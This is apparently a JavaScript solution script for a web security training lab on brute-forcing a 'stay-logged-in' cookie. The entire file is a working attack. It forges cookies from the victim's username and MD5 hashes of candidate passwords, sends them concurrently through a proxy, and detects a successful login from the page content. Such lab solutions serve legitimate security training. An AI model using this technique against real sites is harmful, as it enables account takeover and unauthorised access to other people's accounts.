import md5 from "md5";
import { getParsedInput } from "../../../utils/getParsedInput.js";
import { runTasks } from "../../../utils/runTasks.js";
import { getPasswords } from "../../../../config/config.js";
import { victimsAccount } from "../../../../config/accounts.js";

const { labUrl, concurrencyLimit, httpClient } = getParsedInput({
  description: "Lab: Brute-forcing a stay-logged-in cookie",
  concurrency: true,
  proxy: true,
});

const passwords = await getPasswords();

async function task(password) {
  const resp = await httpClient.get(labUrl, {
    headers: {
      cookie: getCookie(password),
    },
  });

  if (isLoggedIn(resp.data)) {
    console.log(`${password}: success`);
    console.log(
      `Login with username "${victimsAccount.username}" and password "${password}" to solve the lab`,
    );
    process.exit(0);
  } else {
    console.log(`${password}: fail`);
  }
}

function getCookie(password) {
  const hash = md5(password);
  const value = Buffer.from(`${victimsAccount.username}:${hash}`).toString(
    "base64",
  );
  return "stay-logged-in=" + value;
}

function isLoggedIn(html) {
  return html.includes(`my-account?id=${victimsAccount.username}`);
}

const tasks = passwords.map((password) => () => task(password));
runTasks(tasks, concurrencyLimit);
